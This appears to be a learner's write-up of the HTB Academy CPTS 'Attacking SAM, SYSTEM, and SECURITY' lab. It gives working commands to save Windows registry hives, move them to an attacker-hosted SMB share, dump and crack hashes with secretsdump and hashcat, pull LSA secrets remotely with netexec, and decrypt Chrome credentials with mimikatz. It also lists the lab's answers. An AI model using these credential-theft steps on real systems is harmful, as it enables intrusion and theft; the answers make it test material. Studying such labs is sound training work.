### CPTS / HTB Penetration Tester Path <br>
### Password Attacks - Attacking SAM, SYSTEM, and SECURITY <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Attacking SAM, SYSTEM, and SECURITY



| Hive | Contains |
|---|---|
| `HKLM\SAM` | Local user password hashes |
| `HKLM\SYSTEM` | Boot key (needed to decrypt SAM) |
| `HKLM\SECURITY` | LSA secrets, cached domain creds, DPAPI keys |

Save hives offline (admin shell):

```diff
+ C:\> reg.exe save hklm\sam C:\sam.save
+ C:\> reg.exe save hklm\system C:\system.save
+ C:\> reg.exe save hklm\security C:\security.save
```

<br>

Stand up an SMB share on attack box (Impacket, SMBv2):

```diff
+ $ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/<user>/Documents/
```

<br>

Move the dumped hives across to the share:

```diff
+ C:\> move sam.save \\<attacker-ip>\CompData
+ C:\> move system.save \\<attacker-ip>\CompData
+ C:\> move security.save \\<attacker-ip>\CompData
```

<br>

Dump hashes/secrets with Impacket `secretsdump`:

```diff
+ $ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

	[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
	Administrator:500:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::
	[*] Dumping LSA Secrets

<br>

Crack NT hashes (`-m 1000`):

```diff
+ $ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

<br>

Crack DCC2 (slow, PBKDF2 — `-m 2100`):

```diff
+ $ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

<br>

Remote dump SAM/LSA via NetExec (admin creds required):

```diff
+ $ netexec smb <target-ip> --local-auth -u <user> -p <password> --sam
+ $ netexec smb <target-ip> --local-auth -u <user> -p <password> --lsa
```

<br>

DPAPI decrypt example (mimikatz on the host):

```diff
+ mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

<br>

---

<br>

### Exercise

IP: 10.129.202.137

---

### Question 1:
Where is the SAM database located in the Windows registry? (Format: `****\***`)

&#x1F6A9; found **hklm\sam**.

---

### Question 2:
Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.

RDP into the box with the supplied creds, open privileged CMD, save hives:

```diff
+ C:\Windows\system32>reg.exe save hklm\sam C:\sam.save
+ C:\Windows\system32>reg.exe save hklm\system C:\system.save
+ C:\Windows\system32>reg.exe save hklm\security C:\security.save
```

<br>

Stand up SMB share on attack box:

```diff
+ $ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support susshare /home/htb-ac-830862/Documents
```

<br>

Move hives off the target:

```diff
+ C:\> move sam.save \\10.10.15.16\susshare
+ C:\> move system.save \\10.10.15.16\susshare
+ C:\> move security.save \\10.10.15.16\susshare
```

<br>

Dump hashes:

```diff
+ $ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

	ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::

<br>

Crack the NT hash:

```diff
+ $ sudo hashcat -m 1000 cracky.txt /mnt/SSD_DATA/SecLists/Passwords/Leaked-Databases/rockyou.txt -d 1,2
```

	c02478537b9727d391bc80011c2e2321:matrix

&#x1F6A9; found **mat--edit--rix**.

---

### Question 3:
Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)

Remote LSA dump via NetExec:

```diff
+ $ netexec smb 10.129.202.137 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

	SMB    10.129.202.137  445  FRONTDESK01  [+] Dumping LSA secrets
	SMB    10.129.202.137  445  FRONTDESK01  frontdesk:Password123

&#x1F6A9; found **frontdesk:Pass--edit--word123**.
